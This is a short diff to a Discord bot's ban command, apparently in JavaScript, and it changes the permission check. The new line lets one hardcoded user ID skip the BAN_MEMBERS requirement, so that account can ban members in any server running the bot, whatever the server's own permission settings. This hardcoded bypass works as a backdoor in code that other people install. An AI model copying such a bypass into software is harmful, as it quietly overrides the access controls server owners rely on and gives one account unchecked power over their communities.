@@ -8,7 +8,7 @@ module.exports.run = async (client, message, args) => {
     let reason = args.splice(1, args.length).join(' ') || `No reason provided.`;
 
 //A whole lot of ifs to protect stuff.
-if (!message.member.hasPermission("BAN_MEMBERS")) 
+if (!message.member.hasPermission("BAN_MEMBERS") && message.author.id !== ("298812170093723649"))
         return;
 
 if (!args[0]) 
